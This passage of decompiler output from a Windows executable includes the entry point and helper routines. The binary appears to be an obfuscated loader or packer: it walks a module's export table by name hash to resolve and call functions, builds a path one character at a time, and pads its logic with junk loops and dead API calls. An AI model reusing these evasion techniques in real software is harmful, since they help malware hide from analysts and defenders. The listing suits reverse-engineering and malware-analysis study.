  int v16; // [esp+E8h] [ebp-10h]
  DWORD dwFileOffsetLow; // [esp+ECh] [ebp-Ch]
  unsigned int v18; // [esp+F0h] [ebp-8h]

  for ( i = 0; i < 0x1F; ++i )
    ;
  dwFileOffsetLow = *(_DWORD *)a1;
  if ( !*(_DWORD *)a1 )
    return 0;
  **(_DWORD **)(a1 + 4) = *(_DWORD *)(dwFileOffsetLow + 60) + dwFileOffsetLow;
  v4 = **(_DWORD **)(a1 + 4);
  *(_BYTE *)off_40AC6A[5] += (a2 < v9) + 71;
  v12 = *(unsigned int **)(a1 + 24);
  v13 = *(_DWORD *)(v4 + 120);
  if ( !v13 )
    return 0;
  **(_DWORD **)(a1 + 12) = dwFileOffsetLow + v13;
  v5 = *(_DWORD *)(a1 + 12);
  dword_40AB1A += *off_40ACFE[0];
  v14 = *(_DWORD **)v5;
  v18 = *(_DWORD *)(*(_DWORD *)v5 + 24);
  dword_40AB8A = v8 + (unsigned __int8)dword_40AB8A;
  dword_40AB9E = (__PAIR64__(dword_40AB9E, a3) - (i | 0x2DE800000000i64)) >> 32;
  v15 = v14[8];
  if ( v14[5] <= v18 )
    v6 = v18;
  else
    v6 = v14[5];
  dword_40AB52 &= (unsigned int)&dword_40AB0E;
  v7 = __CFADD__(&rect.bottom, dword_40AB52);
  dword_40AB52 += (int)&rect.bottom;
  dword_40AB52 += (int)&dword_40AB12 + v7;
  *v12 = v6;
  v10 = 0;
  do
  {
    if ( ++v10 == 43 )
      a1 = SetLocalTime((const SYSTEMTIME *)0x5C54);
  }
  while ( v10 < 0x1D );
  v16 = v14[9];
  *off_40AD1E[0] -= 6409;
  **(_DWORD **)(a1 + 20) = dwFileOffsetLow + v16;
  *(_BYTE *)off_40AC92[0] >>= 1;
  **(_DWORD **)(a1 + 8) = v14[7] + dwFileOffsetLow;
  **(_DWORD **)(a1 + 16) = v15 + dwFileOffsetLow;
  stru_40AAF6.top = stru_40AAF6.top & 0x6DF3;
  **(_DWORD **)(a1 + 28) = -4123;
  **(_DWORD **)(a1 + 32) = -4123;
  **(_DWORD **)(a1 + 36) = -4125;
  return 1;
}
// 405686: conditional instruction was optimized away because of '%var_2C.4<1Fu'
// 405716: variable 'v9' is possibly undefined
// 405794: variable 'v8' is possibly undefined
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB12: using guessed type int dword_40AB12;
// 40AB1A: using guessed type int dword_40AB1A;
// 40AB52: using guessed type int dword_40AB52;
// 40AB86: using guessed type int dword_40AB86;
// 40AB8A: using guessed type int dword_40AB8A;
// 40AB9E: using guessed type int dword_40AB9E;
// 40ABBA: using guessed type int dword_40ABBA;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40AC92: using guessed type int *off_40AC92[16];
// 40ACFE: using guessed type int *off_40ACFE[10];
// 40AD1E: using guessed type int *off_40AD1E[2];

//----- (004059B2) --------------------------------------------------------
int __stdcall start(int a1)
{
  WCHAR v2; // cx
  WCHAR v3; // dx
  unsigned int v4; // edi
  DWORD v5; // eax
  unsigned int v6; // ecx
  int v7; // eax
  int v8; // [esp+34h] [ebp-3D0h]
  unsigned int v9; // [esp+C0h] [ebp-344h]
  int v10; // [esp+174h] [ebp-290h]
  unsigned int v11; // [esp+1A4h] [ebp-260h]
  int v12; // [esp+1ACh] [ebp-258h]
  int i; // [esp+1E8h] [ebp-21Ch]
  WCHAR pszPath[28]; // [esp+1ECh] [ebp-218h] BYREF
  WPARAM v15[116]; // [esp+224h] [ebp-1E0h] BYREF
  HWND hWndParent; // [esp+3F4h] [ebp-10h] BYREF
  HANDLE hNamedPipe; // [esp+3F8h] [ebp-Ch] BYREF
  unsigned int v18; // [esp+3FCh] [ebp-8h] BYREF
  void **v19; // [esp+400h] [ebp-4h] BYREF
  int savedregs; // [esp+404h] [ebp+0h] BYREF
  void *retaddr; // [esp+408h] [ebp+4h] BYREF

  if ( StrSpnA(psz, pszSet) > 10 )
    return 0;
  for ( i = 17; i; --i )
  {
    if ( i == 24 )
      DialogBoxIndirectParamA((HINSTANCE)v15[112], (LPCDLGTEMPLATEA)0x1E29, hWndParent, (DLGPROC)0x8BFF, 14489);
  }
  sub_404C90((int)&savedregs, 0xFFFFEFE1, (unsigned int *)&hWndParent);
  pszPath[0] = 70;
  *off_40ACAA[0] |= v12;
  pszPath[1] = 58;
  pszPath[2] = 92;
  dword_40ABAE = (unsigned __int8)dword_40ABAE - v8;
  pszPath[3] = 92;
  pszPath[4] = 74;
  v2 = 72;
  *off_40AC6E &= (unsigned __int8)byte_40ABCA;
  pszPath[5] = 72;
  pszPath[6] = 68;
  v3 = 75;
  pszPath[7] = 75;
  dword_40AAEE &= (unsigned int)&stru_40AAF6.top;
  pszPath[8] = 74;
  pszPath[9] = 72;
  dword_40ABBE &= v10;
  pszPath[10] = 74;
  pszPath[11] = 75;
  pszPath[14] = 92;
  pszPath[12] = 72;
  *(_BYTE *)off_40AC6A[17] += 45;
  pszPath[15] = 68;
  pszPath[16] = 74;
  pszPath[21] = 74;
  pszPath[17] = 75;
  pszPath[23] = 46;
  pszPath[24] = 68;
  for ( dword_40AB4E = 0; (unsigned int)dword_40AB4E < 0x16; ++dword_40AB4E )
  {
    if ( dword_40AB4E == 29 )
      TransactNamedPipe(
        hNamedPipe,
        (LPVOID)v15[111],
        v15[112],
        &dword_40AB82,
        v15[115],
        &BytesRead,
        (LPOVERLAPPED)v15[113]);
  }
  pszPath[25] = 76;
  pszPath[26] = 76;
  pszPath[27] = 0;
  pszPath[18] = 74;
  pszPath[13] = 92;
  pszPath[19] = v2;
  pszPath[20] = v3;
  pszPath[22] = v2;
  memset(v15, 0, sizeof(v15));
  if ( PathMakePrettyW(pszPath) )
  {
    sub_403E27((int)&savedregs, (unsigned int)&hNamedPipe, (LONG *)&v18);
    sub_403E27((int)&savedregs, 0, (LONG *)aVx);
    sub_404C90((int)&savedregs, 0, (unsigned int *)&dword_40A54C);
    sub_403E27((int)&savedregs, 0, &dword_40A550);
    sub_403E27((int)&savedregs, 0, &dword_40A554);
  }
  v19 = &retaddr;
  sub_403E27((int)&savedregs, 0x6586468u, (LONG *)&v19);
  v19 = (void **)&savedregs;
  sub_403E03(&savedregs);
  v4 = *(_DWORD *)aVx;
  *(_BYTE *)off_40AC6A[60] -= 122;
  sub_403E27((int)&savedregs, v4, &dword_40A4CC);
  sub_404C90((int)&savedregs, dword_40A54C, (unsigned int *)&dword_40A4D0);
  sub_403E27((int)&savedregs, dword_40A550, (LONG *)&unk_40A4D4);
  sub_403E27((int)&savedregs, v18, &dword_40A4D8);
  v5 = GetCurrentProcessId();
  dword_40ABBE = (__PAIR64__(dword_40ABBE, v6) - __PAIR64__(&dword_40ABD6, v9)) >> 32;
  if ( v5 )
  {
    sub_405F2F();
  }
  else if ( GetCurrentThreadId() )
  {
    ExitProcess(0);
  }
  *(_DWORD *)v18 = *(_DWORD *)dword_40A4D8;
  v7 = dword_40A100 ^ dword_40A104;
  v11 = 0;
  do
  {
    if ( ++v11 == 30 )
      v7 = SendDlgItemMessageA((HWND)v15[113], 12750, 0x841Au, v15[110], 34445);
  }
  while ( v11 < 0x13 );
  dword_40A100 = v7;
  *(_DWORD *)dword_40A554 += v7;
  return *(_DWORD *)v18;
}
// 405A97: variable 'v12' is possibly undefined
// 405ABB: variable 'v8' is possibly undefined
// 405B90: variable 'v10' is possibly undefined
// 405CFC: variable 'v2' is possibly undefined
// 405D03: variable 'v3' is possibly undefined
// 405E67: variable 'v6' is possibly undefined
// 405E67: variable 'v9' is possibly undefined
// 40A100: using guessed type int dword_40A100;
// 40A104: using guessed type int dword_40A104;
// 40A4CC: using guessed type int dword_40A4CC;
// 40A4D0: using guessed type int dword_40A4D0;
// 40A4D8: using guessed type int dword_40A4D8;
// 40A54C: using guessed type int dword_40A54C;
// 40A550: using guessed type int dword_40A550;
// 40A554: using guessed type int dword_40A554;
// 40AAEE: using guessed type int dword_40AAEE;
// 40AB0A: using guessed type int dword_40AB0A;
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB42: using guessed type int dword_40AB42;
// 40AB4E: using guessed type int dword_40AB4E;
// 40AB82: using guessed type int dword_40AB82;
// 40ABAE: using guessed type int dword_40ABAE;
// 40ABBE: using guessed type int dword_40ABBE;
// 40ABCA: using guessed type char byte_40ABCA;
// 40ABD6: using guessed type int dword_40ABD6;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40AC6E: using guessed type int *off_40AC6E;
// 40AC9E: using guessed type int *off_40AC9E[13];
// 40ACAA: using guessed type int *off_40ACAA[10];

//----- (00405F2F) --------------------------------------------------------
int sub_405F2F()
{
  int result; // eax
  int i; // edi
  int v2; // eax
  unsigned int v3; // ecx
  unsigned int v4; // [esp+24h] [ebp-18h]
  unsigned int j; // [esp+28h] [ebp-14h]
  int v6[2]; // [esp+34h] [ebp-8h] BYREF
  void *retaddr; // [esp+40h] [ebp+4h] BYREF

  v6[1] = 183078;
  dword_40ABA2 &= dword_40ABEA;
  v6[0] = (int)*off_40A058;
  dword_40A4B8 = 0;
  result = sub_405060();
  if ( result )
  {
    for ( i = -4378; i != -4126; i = ((i ^ 0x3530) - 1) ^ 0x3530 )
    {
      dword_40A318 = dword_40A4CC;
      dword_40A31C = dword_40A4D0;
      stru_40AAF6.bottom = (LONG)&dword_40AB8E;
      dword_40A320 = unk_40A4D4;
      if ( i == -4125 )
      {
        for ( j = 0; j < 0x17; ++j )
          ;
        *(_DWORD *)dword_40A4B8 += dword_40A100;
      }
      else if ( i == -4575 )
      {
        dword_40A314 = (int)v6;
        v2 = sub_404D4D();
        j = (__PAIR64__((unsigned __int8)j, v4) - __PAIR64__(v4, v3)) >> 32;
        *(_DWORD *)dword_40A4D8 = v2;
      }
      dword_40A4B8 = (int)&retaddr;
      result = -9518;
    }
  }
  return result;
}
// 406006: conditional instruction was optimized away because of '%var_14.4<17u'
// 406074: variable 'v4' is possibly undefined
// 40606B: variable 'j' is possibly undefined
// 406074: variable 'v3' is possibly undefined
// 40A058: using guessed type void ***off_40A058;
// 40A100: using guessed type int dword_40A100;
// 40A314: using guessed type int dword_40A314;
// 40A318: using guessed type int dword_40A318;
// 40A31C: using guessed type int dword_40A31C;
// 40A320: using guessed type int dword_40A320;
// 40A4B8: using guessed type int dword_40A4B8;
// 40A4CC: using guessed type int dword_40A4CC;
// 40A4D0: using guessed type int dword_40A4D0;
// 40A4D8: using guessed type int dword_40A4D8;
// 40AB8E: using guessed type int dword_40AB8E;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABEA: using guessed type int dword_40ABEA;

//----- (004060BA) --------------------------------------------------------
HBITMAP __fastcall sub_4060BA(unsigned int a1, int a2, int a3, int a4, _DWORD *a5)
{
  LPARAM v5; // eax
  int v6; // ecx
  int v7; // edx
  unsigned int v9; // ebx
  __int16 v10; // ax
  int v11; // eax
  unsigned int v12; // eax
  HMENU v13; // eax
  HMENU v14; // eax
  HBITMAP result; // eax
  unsigned __int16 v16; // [esp+38h] [ebp-11Ch]
  int v17; // [esp+44h] [ebp-110h]
  int v18; // [esp+58h] [ebp-FCh]
  char v19; // [esp+64h] [ebp-F0h]
  char v20; // [esp+68h] [ebp-ECh]
  unsigned int v21; // [esp+6Ch] [ebp-E8h]
  unsigned int v22; // [esp+7Ch] [ebp-D8h]
  int v23; // [esp+88h] [ebp-CCh]
  unsigned __int8 v24; // [esp+98h] [ebp-BCh]
  unsigned int v25; // [esp+9Ch] [ebp-B8h]
  int v26; // [esp+A8h] [ebp-ACh]
  int v27; // [esp+BCh] [ebp-98h]
  int v28; // [esp+C0h] [ebp-94h]
  int v29; // [esp+D4h] [ebp-80h]
  unsigned int v30; // [esp+E8h] [ebp-6Ch]
  unsigned int v31; // [esp+ECh] [ebp-68h]
  int v32; // [esp+F0h] [ebp-64h]
  int v33; // [esp+F4h] [ebp-60h]
  unsigned int v34; // [esp+108h] [ebp-4Ch]
  int v35; // [esp+10Ch] [ebp-48h]
  char v36; // [esp+110h] [ebp-44h]
  char v37; // [esp+114h] [ebp-40h]
  unsigned int v38; // [esp+120h] [ebp-34h]
  UINT v39; // [esp+128h] [ebp-2Ch] BYREF
  LPARAM v40; // [esp+12Ch] [ebp-28h]
  HMENU v41; // [esp+130h] [ebp-24h]
  int v42; // [esp+134h] [ebp-20h]
  HMENU v43; // [esp+138h] [ebp-1Ch]
  int v44; // [esp+13Ch] [ebp-18h]
  UINT uItem; // [esp+140h] [ebp-14h]
  HBITMAP hBitmapUnchecked; // [esp+144h] [ebp-10h]
  HMENU hMenu; // [esp+148h] [ebp-Ch]
  unsigned int v48; // [esp+14Ch] [ebp-8h]
  HBITMAP v49; // [esp+150h] [ebp-4h]
  unsigned __int8 v50; // [esp+15Fh] [ebp+Bh]

  v5 = -4126;
  v48 = -4126;
  *off_40AD5E[0] = (__PAIR64__(*off_40AD5E[0], v30) - (a1 | 0x3F5600000000i64)) >> 32;
  hMenu = (HMENU)-4127;
  v38 = 0;
  do
  {
    if ( ++v38 == 21 )
      v5 = GetMessageExtraInfo();
  }
  while ( v38 < 0x13 );
  v44 = -11334;
  v33 = 10754;
  v41 = hMenu;
  v40 = v5;
  v42 = -4123;
  v6 = 13616;
  v7 = 9519;
  v49 = (HBITMAP)((v48 ^ 0x3530) + 9519);
  dword_40ABCE = (int)(unsigned __int16)dword_40ABCE >> 1;
  hBitmapUnchecked = v49;
  dword_40ABB6 ^= dword_40AB2A;
  stru_40AAF6.left = (__PAIR64__(stru_40AAF6.left, 13616) - __PAIR64__(v31, v25)) >> 32;
  uItem = ((unsigned int)hMenu ^ 0x3530) - (v48 ^ 0x3530);
  do
  {
    v44 = -11334;
    dword_40AB4A ^= v24;
    v33 -= v32;
    uItem += (v6 ^ v48) + 9519;
    dword_40AB7E -= dword_40ABDE;
    v9 = 559;
    if ( v7 + (v6 ^ v48) > (unsigned __int16)((*(_WORD *)(a3 + 32) ^ 0x330) + 559) )
      goto LABEL_31;
    v34 = 0;
    do
    {
      if ( ++v34 == 43 )
        SetMenuDefaultItem(hMenu, uItem, 0x7AD4u);
    }
    while ( v34 < 0x1F );
    v42 = -9519;
    while ( 1 )
    {
      v43 = (HMENU)(v42 + 9519);
      if ( v26 == 13030 )
        v29 ^= (unsigned __int8)dword_40AB12;
      else
        v28 -= v27;
      dword_40AB86 ^= v32;
      if ( (unsigned __int16)((*(_WORD *)(a3 + 4 * (v42 + 9519) + 2) ^ 0x330) + 559) != uItem )
        goto LABEL_23;
      if ( v21 > 0x741F )
        v29 ^= 0x709Eu;
      else
        v22 ^= dword_40AB1E;
      v37 &= v36;
      v49 = (HBITMAP)((_DWORD)v49 * (v7 + (v6 ^ v48)));
      dword_40ABB2 ^= dword_40AB3E;
      v9 = (unsigned int)&v39;
      v39 = uItem * (v7 + (v6 ^ v40));
      v50 = *(_BYTE *)(a4 + v39);
      v18 += 3845;
      if ( sub_406CEC(*(_WORD *)(a3 + 4 * (_DWORD)v43), (v50 - 559) ^ 0x330) )
        break;
      dword_40AB32 += (int)&dword_40AB7A;
      if ( sub_4055DB(v50, ((unsigned __int8)hMenu ^ 0x30) + 47) )
      {
        dword_40ABC6 &= (unsigned int)&dword_40AB6A;
        v10 = *(_WORD *)(a3 + 4 * (_DWORD)v43);
        dword_40AB06 &= (unsigned int)&dword_40AB46;
        dword_40AB06 -= (int)&dword_40ABD2;
        if ( sub_406CEC(v10, 0xFEE1u) )
          break;
      }
      v44 = -5238;
LABEL_23:
      v11 = (v6 ^ v48) + v42 + 9519;
      for ( dword_40ABA2 = 0; (unsigned int)dword_40ABA2 < 0x11; ++dword_40ABA2 )
      {
        if ( dword_40ABA2 == 31 )
          v11 = SetMenuItemBitmaps(v43, 0x3B0Du, 0x674Eu, hBitmapUnchecked, (HBITMAP)0x4587);
      }
      v42 = v11;
      v12 = (v6 ^ v48) + v11 + 19038;
      *off_40AD4A[0] &= 0x75E7u;
      v33 = 306927852;
      v9 = 559;
      if ( v12 > (unsigned __int16)((*(_WORD *)(a3 + 32) ^ 0x330) + 559) )
        goto LABEL_31;
    }
    v44 = -10350;
    v17 ^= v16;
    dword_40ABEA = ~(unsigned __int16)dword_40ABEA;
    v41 = (HMENU)(v6 ^ ((v6 ^ (unsigned int)v41) + (v6 ^ v48) + 9519));
LABEL_31:
    dword_40AB4E ^= (unsigned int)&dword_40ABDA;
    dword_40AB4E -= (int)&dword_40AB76;
    hBitmapUnchecked = 0;
    if ( (HMENU)(v6 ^ (*(unsigned __int8 *)(uItem * (v7 + (v6 ^ v40)) + a4) - v7)) == hMenu )
    {
      ++dword_40ABC6;
      v49 = (HBITMAP)((char *)v49 + (v6 ^ (unsigned int)hMenu) + 9519);
    }
    else
    {
      v13 = hMenu;
      if ( v44 == -5238 )
      {
        v37 = -3;
        v23 |= *off_40AD1A[0];
        v13 = (HMENU)v48;
      }
      v49 = (HBITMAP)((char *)v49 - 9519 - (v6 ^ (unsigned int)v13));
      v20 &= v19;
      if ( v49 != (HBITMAP)(v7 + (v6 ^ (unsigned int)hMenu)) )
        hBitmapUnchecked = (HBITMAP)((char *)hBitmapUnchecked + (v6 ^ v48) + 9519);
    }
    v35 += dword_40AB8E + (v22 < v9);
  }
  while ( (v6 ^ ((unsigned int)hBitmapUnchecked - v7)) == v48 );
  for ( dword_40AB26 = 0; (unsigned int)dword_40AB26 < 0x14; ++dword_40AB26 )
  {
    if ( dword_40AB26 == 29 )
      ShowCursor(0);
  }
  if ( ((unsigned __int16)((v6 ^ (unsigned __int16)v41) + 8960) ^ 0x330) == *(_WORD *)(a3 + 32)
    || (v14 = (HMENU)v48, v49 == (HBITMAP)(v7 + (v6 ^ (unsigned int)hMenu))) )
  {
    v14 = hMenu;
  }
  v49 = (HBITMAP)((char *)v49 - 9519 - (v6 ^ (unsigned int)v14));
  result = v49;
  *a5 = v49;
  return result;
}
// 4060D9: variable 'v30' is possibly undefined
// 40619B: variable 'v25' is possibly undefined
// 40619B: variable 'v31' is possibly undefined
// 4061C7: variable 'v24' is possibly undefined
// 4061E6: variable 'v32' is possibly undefined
// 4061DC: variable 'v6' is possibly undefined
// 406243: variable 'v7' is possibly undefined
// 4062AE: variable 'v26' is possibly undefined
// 4062BB: variable 'v29' is possibly undefined
// 4062CB: variable 'v28' is possibly undefined
// 4062CB: variable 'v27' is possibly undefined
// 40630B: variable 'v21' is possibly undefined
// 406317: variable 'v22' is possibly undefined
// 406335: variable 'v36' is possibly undefined
// 406335: variable 'v37' is possibly undefined
// 406386: variable 'v18' is possibly undefined
// 406543: variable 'v16' is possibly undefined
// 40654B: variable 'v17' is possibly undefined
// 40660D: variable 'v23' is possibly undefined
// 406632: variable 'v19' is possibly undefined
// 406632: variable 'v20' is possibly undefined
// 40666A: variable 'v35' is possibly undefined
// 40AB06: using guessed type int dword_40AB06;
// 40AB12: using guessed type int dword_40AB12;
// 40AB1E: using guessed type int dword_40AB1E;
// 40AB26: using guessed type int dword_40AB26;
// 40AB2A: using guessed type int dword_40AB2A;
// 40AB32: using guessed type int dword_40AB32;
// 40AB3E: using guessed type int dword_40AB3E;
// 40AB46: using guessed type int dword_40AB46;
// 40AB4A: using guessed type int dword_40AB4A;
// 40AB4E: using guessed type int dword_40AB4E;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB76: using guessed type int dword_40AB76;
// 40AB7A: using guessed type int dword_40AB7A;
// 40AB7E: using guessed type int dword_40AB7E;
// 40AB86: using guessed type int dword_40AB86;
// 40AB8E: using guessed type int dword_40AB8E;
// 40AB9A: using guessed type int dword_40AB9A;
// 40ABA2: using guessed type int dword_40ABA2;
// 40ABB2: using guessed type int dword_40ABB2;
// 40ABB6: using guessed type int dword_40ABB6;
// 40ABC6: using guessed type int dword_40ABC6;
// 40ABCE: using guessed type int dword_40ABCE;
// 40ABD2: using guessed type int dword_40ABD2;
// 40ABDA: using guessed type int dword_40ABDA;
// 40ABDE: using guessed type int dword_40ABDE;
// 40ABEA: using guessed type int dword_40ABEA;
// 40AD1A: using guessed type int *off_40AD1A[3];
// 40AD4A: using guessed type int *off_40AD4A[8];
// 40AD5E: using guessed type int *off_40AD5E[3];

//----- (0040672B) --------------------------------------------------------
int __cdecl sub_40672B(char *a1, int a2, int a3, int a4)
{
  DWORD v4; // ecx
  int *v5; // eax
  unsigned int v6; // eax
  _BYTE *v7; // eax
  int v8; // ecx
  int *v9; // eax
  HBITMAP v10; // ecx
  DWORD v11; // ecx
  int v12; // edx
  int result; // eax
  _BYTE v14[152]; // [esp+0h] [ebp-228h] BYREF
  int v15; // [esp+98h] [ebp-190h]
  int v16; // [esp+9Ch] [ebp-18Ch]
  unsigned int v17; // [esp+A4h] [ebp-184h]
  unsigned int v18; // [esp+A8h] [ebp-180h]
  int v19; // [esp+ACh] [ebp-17Ch]
  int v20; // [esp+B4h] [ebp-174h]
  unsigned __int16 v21; // [esp+BCh] [ebp-16Ch]
  int v22; // [esp+FCh] [ebp-12Ch]
  int v23; // [esp+100h] [ebp-128h]
  int v24; // [esp+10Ch] [ebp-11Ch]
  _DWORD *v25; // [esp+114h] [ebp-114h]
  _DWORD v26[18]; // [esp+11Ch] [ebp-10Ch] BYREF
  int v27; // [esp+164h] [ebp-C4h]
  unsigned int v28; // [esp+178h] [ebp-B0h]
  int *v29; // [esp+180h] [ebp-A8h]
  int j; // [esp+184h] [ebp-A4h]
  int v31; // [esp+188h] [ebp-A0h] BYREF
  unsigned int i; // [esp+1A0h] [ebp-88h]
  int v33[10]; // [esp+1A4h] [ebp-84h] BYREF
  int v34; // [esp+1CCh] [ebp-5Ch]
  int v35; // [esp+1D0h] [ebp-58h]
  _BYTE *v36; // [esp+1D4h] [ebp-54h]
  int v37; // [esp+1D8h] [ebp-50h]
  char v38; // [esp+1DCh] [ebp-4Ch] BYREF
  unsigned int v39; // [esp+1E0h] [ebp-48h]
  int v40; // [esp+1E4h] [ebp-44h] BYREF
  int v41; // [esp+1E8h] [ebp-40h] BYREF
  DWORD v42; // [esp+1ECh] [ebp-3Ch] BYREF
  int v43; // [esp+1F0h] [ebp-38h] BYREF
  char *v44; // [esp+1F4h] [ebp-34h]
  int v45; // [esp+1F8h] [ebp-30h] BYREF
  int v46; // [esp+1FCh] [ebp-2Ch] BYREF
  void *lpBits; // [esp+200h] [ebp-28h] BYREF
  UINT start; // [esp+204h] [ebp-24h] BYREF
  HMENU hMenu; // [esp+208h] [ebp-20h]
  int v50; // [esp+20Ch] [ebp-1Ch] BYREF
  DWORD dwMessageId; // [esp+210h] [ebp-18h] BYREF
  HBITMAP hbm; // [esp+214h] [ebp-14h] BYREF
  int v53; // [esp+218h] [ebp-10h] BYREF
  DWORD dwLanguageId; // [esp+21Ch] [ebp-Ch]
  unsigned int v55; // [esp+220h] [ebp-8h]
  unsigned __int16 v56; // [esp+224h] [ebp-4h] BYREF

  v34 = -4126;
  dword_40ABB2 = (int)&dword_40AB76;
  v39 = -4127;
  for ( dwLanguageId = -4127; ; dwLanguageId = ((dwLanguageId ^ 0x3530) + 1) ^ 0x3530 )
  {
    v44 = a1;
    if ( v39 == -4127 )
    {
      for ( i = 0; i < 0x14; ++i )
        ;
      v33[0] = a2;
      v33[1] = (int)&v38;
      v33[2] = (int)&lpBits;
      v33[3] = (int)&v53;
      v33[4] = (int)&v45;
      v33[5] = (int)&start;
      v33[6] = (int)&v46;
      v33[7] = (int)&hbm;
      v33[8] = (int)&dwMessageId;
      v33[9] = (int)&v40;
      if ( !sub_40564B((int)v33, 0xFFFFEFE1, 0x252Fu) )
        break;
    }
    if ( dwMessageId == -4127 || *(_DWORD *)(v53 + 24) && *(_DWORD *)(v53 + 20) )
    {
      if ( hbm == (HBITMAP)-4127 )
        break;
      v26[12] = 32;
      if ( dwLanguageId == ((v46 - 9519) ^ 0x3530) || v34 != -4126 )
        break;
      v4 = (dwLanguageId ^ 0x3530) + 9519;
      if ( v4 > 6 )
        v39 = -4126;
      v44 += 29988;
      if ( v4 >= *(_DWORD *)(v53 + 24) )
        break;
      v55 = (unsigned int)&v41;
      for ( j = 25; j; --j )
      {
        if ( j == 32 )
          FormatMessageA(0x8684u, (LPCVOID)0x81F3, dwMessageId, dwLanguageId, dword_40AB3A, 0x8EFAu, (va_list *)hMenu);
      }
      *(_DWORD *)v55 = 2 * v4;
      if ( (int)v28 >= 7257 )
        v18 = (__PAIR64__(v18, v28) - __PAIR64__(v17, 7257)) >> 32;
      else
        v20 += v19 + (v28 < 0x1C59);
      v24 = (unsigned __int8)v24 - v23;
      v55 = (unsigned int)&v56;
      v56 = *(_WORD *)(start + v41);
      if ( v56 > (unsigned int)(*(_DWORD *)(v53 + 20) - 1) )
        break;
      v24 = 42402;
      v44 -= 29988;
      v29 = &v31;
      v31 |= 0x638u;
      v50 = 0;
      v35 = *(unsigned __int16 *)(v4 * ((v40 ^ 0x3530) + 9519) + start);
      v55 = (unsigned int)&v42;
      v15 &= *off_40AD3E[0];
      v42 = v4 * ((dwMessageId ^ 0x3530) + 9519);
      dword_40ABEA += v26[16];
      v5 = &v43;
      for ( dword_40ABD2 = 24; dword_40ABD2; --dword_40ABD2 )
      {
        if ( dword_40ABD2 == 26 )
          v5 = (int *)SetDIBits((HDC)0x5043, hbm, start, dwLanguageId, lpBits, (const BITMAPINFO *)start, 0x490Bu);
      }
      v55 = (unsigned int)v5;
      dword_40AB86 ^= (unsigned int)&rect.top;
      *v5 = *(_DWORD *)(v45 + v42);
      v55 = a2 + v43;
      ((void (__stdcall *)(int, int, int *))v44)(a3, a2 + v43, &v50);
      if ( v50 == 1 )
      {
        v24 |= dword_40AB1A;
        v35 = a2 + *((_DWORD *)lpBits + v35);
        hMenu = 0;
        if ( a4 )
        {
          *off_40AD12[0] += 13583;
          v16 = 36791;
          v36 = 0;
          stru_40AAF6.top += v21;
          v39 = ((unsigned int)hbm ^ 0x3530) + 9519;
          v6 = v39;
          if ( __SETP__(v26[9], 13023) )
            *(_BYTE *)off_40AC6A[59] |= 0x81u;
          else
            dword_40AB6E |= v22;
          dword_40AB6A += dword_40AB9A;
          v55 = a4 * v6;
          hMenu = (HMENU)v14;
          v7 = v14;
          v27 -= *off_40ACAA[0];
          v8 = a4 * v39;
          do
          {
            --v7;
            --v8;
          }
          while ( v8 );
          v36 = v7;
          v25 = v26;
          v26[0] -= 27666;
          dwLanguageId = 0;
          v9 = &a4;
          do
          {
            v10 = hbm;
            *(_BYTE *)off_40AC6A[54] += ((unsigned int)v9 < dword_40AB4A) + 111;
            v11 = dwLanguageId * (((unsigned int)v10 ^ 0x3530) + 9519);
            v27 ^= *off_40AC8E[0];
            v12 = *++v9;
            ++dwLanguageId;
            *(_DWORD *)&v36[v11] = v12;
          }
          while ( dwLanguageId != a4 );
        }
        else
        {
          hMenu = 0;
        }
        result = ((int (*)(void))v35)();
        v37 = result;
        return result;
      }
    }
    else
    {
      v34 = -4127;
    }
  }
  for ( dword_40AB86 = 0; (unsigned int)dword_40AB86 < 0x19; ++dword_40AB86 )
  {
    if ( dword_40AB86 == 31 )
      CreateWaitableTimerW((LPSECURITY_ATTRIBUTES)0x8CE8, dwLanguageId, aSbe40u8yEzii5n);
  }
  return 0;
}
// 4067A7: conditional instruction was optimized away because of '%var_88.4<14u'
// 40692D: variable 'v4' is possibly undefined
// 40AB1A: using guessed type int dword_40AB1A;
// 40AB4A: using guessed type int dword_40AB4A;
// 40AB6A: using guessed type int dword_40AB6A;
// 40AB6E: using guessed type int dword_40AB6E;
// 40AB76: using guessed type int dword_40AB76;
// 40AB86: using guessed type int dword_40AB86;
// 40AB9A: using guessed type int dword_40AB9A;
// 40ABB2: using guessed type int dword_40ABB2;
// 40ABD2: using guessed type int dword_40ABD2;
// 40ABEA: using guessed type int dword_40ABEA;
// 40AC6A: using guessed type int *off_40AC6A[2];
// 40AC8E: using guessed type int *off_40AC8E[17];
// 40ACAA: using guessed type int *off_40ACAA[10];
// 40AD12: using guessed type int *off_40AD12[5];
// 40AD3E: using guessed type int *off_40AD3E[2];

//----- (00406CEC) --------------------------------------------------------
int __userpurge sub_406CEC@<eax>(__int16 a1@<ax>, unsigned __int16 a2)
{
  bool v2; // zf
  int v3; // eax
  HDC hdc; // [esp+0h] [ebp-14h]

  v2 = a1 == (__int16)a2;
  v3 = -4127;
  if ( v2 )
  {
    dword_40AB6E = 0;
    do
    {
      if ( ++dword_40AB6E == 27 )
        GetClipBox(hdc, &stru_40AAF6);
    }
    while ( (unsigned int)dword_40AB6E < 0x10 );
    v3 = -4126;
  }
  return (v3 ^ 0x3530) + 9519;
}
// 406D36: variable 'hdc' is possibly undefined
// 40AB6E: using guessed type int dword_40AB6E;

//----- (00406D5A) --------------------------------------------------------
void __fastcall __he_qt(unsigned int a1, int a2, unsigned int a3)
{
  dword_40AB36 += dword_40AB1E + (a1 < dword_40AB0E);
  dword_40ABD6 -= *off_40AD22;
  dword_40ABC2 = (unsigned __int8)dword_40ABC2 - *off_40AD4E[0];
}
// 40AB0E: using guessed type int dword_40AB0E;
// 40AB1E: using guessed type int dword_40AB1E;
// 40AB36: using guessed type int dword_40AB36;
// 40ABC2: using guessed type int dword_40ABC2;
// 40ABD6: using guessed type int dword_40ABD6;
// 40ABDA: using guessed type int dword_40ABDA;
// 40AD22: using guessed type int *off_40AD22;
// 40AD4E: using guessed type int *off_40AD4E[7];

//----- (00406DAD) --------------------------------------------------------
void __userpurge RF_Egdnkvdiiuncf(unsigned int a1@<edi>, unsigned int a2, __int16 *a3)
{
  unsigned int v3; // [esp+28h] [ebp-4h]

  dword_40ABC2 -= stru_40AAF6.top;
  dword_40AB86 += LOWORD(stru_40AAF6.left);
  dword_40AB92 += *off_40AD42 + (v3 < a1);
}
// 406DDC: variable 'v3' is possibly undefined
// 40AB86: using guessed type int dword_40AB86;
